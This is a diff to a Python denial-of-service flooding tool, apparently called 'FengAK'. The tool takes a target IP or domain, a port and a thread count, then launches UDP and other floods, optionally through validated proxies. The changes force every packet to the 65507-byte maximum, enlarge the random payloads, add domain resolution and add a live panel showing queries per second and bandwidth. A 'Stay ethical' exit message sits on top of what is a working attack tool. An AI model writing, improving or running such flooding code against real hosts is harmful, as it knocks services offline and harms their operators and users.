@@ -14,6 +14,8 @@ try:
 except ImportError:
     SCAPY_AVAILABLE = False
 
+MAX_PACKET_SIZE = 65507
+
 class AttackStats:
     def __init__(self):
         self.running = False
@@ -22,9 +24,12 @@ class AttackStats:
         self.bytes_sent = 0
         self.peak_qps = 0
         self.errors = 0
+        self.threads = 0
         self._lock = threading.Lock()
         self._last_count = 0
         self._last_time = 0
+        self._last_bytes = 0
+        self._last_bw_time = 0
 
     def add_packet(self, size=0):
         with self._lock:
@@ -62,11 +67,12 @@ class AttackStats:
     def get_bandwidth(self):
         now = time.time()
         with self._lock:
-            dt = now - self._last_time if self._last_time else 1
+            dt = now - self._last_bw_time if self._last_bw_time else 1
             if dt <= 0:
                 dt = 1
-            bw = (self.bytes_sent - self._last_bytes) / dt if hasattr(self, '_last_bytes') else 0
+            bw = (self.bytes_sent - self._last_bytes) / dt / 1024 / 1024
             self._last_bytes = self.bytes_sent
+            self._last_bw_time = now
             return bw
 
 stats = AttackStats()
@@ -229,7 +235,7 @@ def generate_random_payload(size):
         lambda s: b"A" * s,
         lambda s: b"\x00" * s,
         lambda s: (b"PAYLOAD" * (s // 7 + 1))[:s],
-        lambda s: bytes([random.randint(0, 255) for _ in range(min(s, 4096))]),
+        lambda s: bytes([random.randint(0, 255) for _ in range(min(s, 65507))]),
     ]
     return random.choice(patterns)(size)
 
@@ -252,11 +258,13 @@ def monitor_stats(target_ip, target_port, mode):
         print_status_panel(stats, target_ip, target_port, mode)
         time.sleep(1)
 
-def run_attack(target_ip, target_port, mode, packet_size, threads, proxy_list=None):
+def run_attack(target_ip, target_port, mode, threads, proxy_list=None):
     stats.running = True
     stats.start_time = time.time()
     stats.peak_qps = 0
     stats.errors = 0
+    stats.threads = threads
+    packet_size = MAX_PACKET_SIZE
 
     mode_map = {
         "udp": udp_flood,
@@ -302,27 +310,28 @@ def run_attack(target_ip, target_port, mode, packet_size, threads, proxy_list=No
         t.join(timeout=2)
 
     elapsed = stats.get_elapsed()
-    sent = stats.get_sent()
     entry = {
         "time": datetime.now().isoformat(),
         "target": f"{target_ip}:{target_port}",
         "mode": mode,
         "threads": threads,
-        "sent": sent,
+        "sent": stats.get_sent(),
         "bytes": stats.get_bytes(),
         "elapsed": elapsed,
         "errors": stats.errors,
         "peak_qps": stats.peak_qps,
     }
     save_log(entry)
-    print(f"\n{color.GREEN}╔{'═' * 58}╗{color.RESET}")
-    print(f"{color.GREEN}║{color.RESET} {color.BOLD}ATTACK SUMMARY{color.RESET}")
-    print(f"{color.GREEN}║{color.RESET}  Total Sent : {format_number(sent)}")
-    print(f"{color.GREEN}║{color.RESET}  Total Data : {format_bytes(stats.get_bytes())}")
-    print(f"{color.GREEN}║{color.RESET}  Duration   : {elapsed:.1f}s")
-    print(f"{color.GREEN}║{color.RESET}  Peak QPS   : {format_number(stats.peak_qps)}")
-    print(f"{color.GREEN}║{color.RESET}  Errors     : {stats.errors}")
-    print(f"{color.GREEN}╚{'═' * 58}╝{color.RESET}")
+
+    print(f"\n{color.GREEN}{'─' * 50}{color.RESET}")
+    print(f"{color.GREEN}{color.BOLD}ATTACK SUMMARY{color.RESET}")
+    print(f"{color.GREEN}{'─' * 50}{color.RESET}")
+    print(f"  Total Sent : {format_number(stats.get_sent())}")
+    print(f"  Total Data : {format_bytes(stats.get_bytes())}")
+    print(f"  Duration   : {elapsed:.1f}s")
+    print(f"  Peak QPS   : {format_number(stats.peak_qps)}")
+    print(f"  Errors     : {stats.errors}")
+    print(f"{color.GREEN}{'─' * 50}{color.RESET}")
 
 def handle_error(allow_edit=True):
     while True:
@@ -338,7 +347,7 @@ def handle_error(allow_edit=True):
             choice = input(f"{color.YELLOW}[?] Return to menu (y) or Exit (n): {color.RESET}").strip().lower()
             if choice == 'y': return 'y'
             elif choice == 'n':
-                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
+                print(f"{color.GREEN}[*] Exiting. Stay ethical.{color.RESET}")
                 sys.exit(0)
             else: print(f"{color.RED}[-] Invalid input. Please enter 'y' or 'n'.{color.RESET}")
 
@@ -370,69 +379,35 @@ def validate_proxies(proxy_list, timeout=2):
     print(f"{color.GREEN}[+] {len(valid)} / {len(proxy_list)} proxies are alive.{color.RESET}")
     return valid
 
-def get_terminal_width():
-    try:
-        return os.get_terminal_size().columns
-    except Exception:
-        return 80
-
-def strip_ansi(text):
-    import re
-    return re.sub(r'\x1b\[[0-9;]*m', '', text)
-
 def print_status_panel(stats_obj, target_ip, target_port, mode):
     elapsed = stats_obj.get_elapsed()
-    sent = stats_obj.get_sent()
-    qps = stats_obj.get_qps()
-    bw = stats_obj.get_bandwidth()
-    peak = stats_obj.peak_qps
     minutes = int(elapsed // 60)
     seconds = int(elapsed % 60)
+    qps = stats_obj.get_qps()
+    bw = stats_obj.get_bandwidth()
 
-    width = get_terminal_width()
-    fields = [
-        f"TARGET  {target_ip}:{target_port}",
-        f"MODE    {mode.upper()}",
-        f"TIME    {minutes:02d}:{seconds:02d}",
-        f"SENT    {format_number(sent)}",
-        f"QPS     {format_number(qps)}",
-        f"PEAK    {format_number(peak)}",
-        f"DATA    {format_bytes(stats_obj.get_bytes())}",
-        f"ERRORS  {stats_obj.errors}",
+    lines = [
+        f"{color.CYAN}{'─' * 50}{color.RESET}",
+        f"{color.BOLD}FengAK LIVE{color.RESET}  {color.DIM}{datetime.now().strftime('%H:%M:%S')}{color.RESET}",
+        f"{color.DIM}TARGET{color.RESET} {target_ip}:{target_port}   {color.DIM}MODE{color.RESET} {mode.upper()}",
+        f"{color.DIM}TIME{color.RESET}   {minutes:02d}:{seconds:02d}   {color.DIM}THREADS{color.RESET} {stats_obj.threads}",
+        f"{color.GREEN}SENT{color.RESET}   {format_number(stats_obj.get_sent()):>8}   {color.GREEN}QPS{color.RESET}   {format_number(qps):>8}",
+        f"{color.YELLOW}DATA{color.RESET}   {format_bytes(stats_obj.get_bytes()):>8}   {color.YELLOW}BW{color.RESET}   {bw:.2f} MB/s",
+        f"{color.MAGENTA}PEAK{color.RESET}   {format_number(stats_obj.peak_qps):>8}   {color.RED}ERR{color.RESET}   {stats_obj.errors:>8}",
+        f"{color.CYAN}{'─' * 50}{color.RESET}",
     ]
-
-    half = len(fields) // 2
-    left = fields[:half]
-    right = fields[half:]
-    rows = max(len(left), len(right))
-    while len(left) < rows:
-        left.append("")
-    while len(right) < rows:
-        right.append("")
-
-    col_w = max(len(strip_ansi(l)) for l in left + right) if left else 20
-    col_w = min(col_w, (width - 8) // 2 - 2)
-
-    lines = []
-    header = f" LIVE STATUS ".center(width - 4)
-    lines.append(f"{color.CYAN}╔{'═' * (width - 4)}╗{color.RESET}")
-    lines.append(f"{color.CYAN}║{color.RESET} {color.BOLD}{header}{color.RESET} {color.CYAN}║{color.RESET}")
-    lines.append(f"{color.CYAN}╠{'═' * (width - 4)}╣{color.RESET}")
-
-    for l, r in zip(left, right):
-        lp = col_w - len(strip_ansi(l))
-        rp = col_w - len(strip_ansi(r))
-        lp = max(0, lp)
-        rp = max(0, rp)
-        mid = width - 4 - 2 - col_w - lp - 2 - col_w - rp
-        mid = max(0, mid)
-        line = f"{color.CYAN}║{color.RESET} {color.GREEN}{l}{' ' * lp}{color.RESET} {color.DIM}{' ' * mid}{color.RESET} {color.YELLOW}{r}{' ' * rp}{color.RESET} {color.CYAN}║{color.RESET}"
-        lines.append(line)
-
-    lines.append(f"{color.CYAN}╚{'═' * (width - 4)}╝{color.RESET}")
 
     print("\033[" + str(len(lines)) + "A\033[J", end="")
     print("\n".join(lines), flush=True)
+
+def resolve_target(target):
+    try:
+        ip = socket.gethostbyname(target)
+        print(f"{color.GREEN}[+] Resolved {target} -> {ip}{color.RESET}")
+        return ip
+    except socket.gaierror:
+        print(f"{color.RED}[-] Could not resolve domain: {target}{color.RESET}")
+        return None
 
 def show_banner():
     os.system("clear")
@@ -480,15 +455,22 @@ def main():
 
         if choice not in mode_map:
             print(f"{color.RED}[-] Invalid choice.{color.RESET}")
+            continue
 
         mode = mode_map[choice]
-        target_ip = input(f"{color.CYAN}[?] Target IP: {color.RESET}").strip()
+        target = input(f"{color.CYAN}[?] Target IP or Domain: {color.RESET}").strip()
+        if not target:
+            print(f"{color.RED}[-] Target cannot be empty.{color.RESET}")
+            handle_error()
+            continue
+
+        target_ip = resolve_target(target)
         if not target_ip:
-            target_ip = config.get("target_ip", "127.0.0.1")
-            print(f"{color.YELLOW}[*] Using default target: {target_ip}{color.RESET}")
+            handle_error()
+            continue
 
         try:
-            target_port = int(input(f"{color.CYAN}[?] Target port (default 80): {color.RESET}").strip() or config.get("target_port", 80))
+            target_port = int(input(f"{color.CYAN}[?] Target port (default 80): {color.RESET}").strip() or 80)
             if target_port <= 0:
                 raise ValueError
         except ValueError:
@@ -497,18 +479,10 @@ def main():
             continue
 
         try:
-            packet_size = int(input(f"{color.CYAN}[?] Packet size (default 64): {color.RESET}").strip() or config.get("packet_size", 64))
-            if packet_size <= 0:
-                raise ValueError
-        except ValueError:
-            print(f"{color.RED}[-] Packet size must be greater than zero.{color.RESET}")
-            handle_error()
-            continue
-
-        try:
-            threads = int(input(f"{color.CYAN}[?] Threads (default 10): {color.RESET}").strip() or config.get("threads", 10))
+            threads = int(input(f"{color.CYAN}[?] Threads (default 10): {color.RESET}").strip() or 10)
             if threads <= 0:
                 raise ValueError
+
         except ValueError:
             print(f"{color.RED}[-] Threads must be greater than zero.{color.RESET}")
             handle_error()
@@ -528,13 +502,12 @@ def main():
                 handle_error()
                 continue
 
-        print(f"\n{color.GREEN}[*] Launching {mode.upper()} attack against {target_ip}:{target_port} with {threads} threads...{color.RESET}")
+        print(f"\n{color.GREEN}[*] Launching {mode.upper()} against {target_ip}:{target_port} with {threads} threads...{color.RESET}")
         print(f"{color.DIM}[*] Press Ctrl+C to stop.{color.RESET}\n")
 
-        run_attack(target_ip, target_port, mode, packet_size, threads, proxy_list)
+        run_attack(target_ip, target_port, mode, threads, proxy_list)
 
-        again = handle_error(allow_edit=False)
-        if again == 'n':
+        if handle_error(allow_edit=False) == 'n':
             print(f"{color.GREEN}[*] Exiting. Stay ethical.{color.RESET}")
             break
 
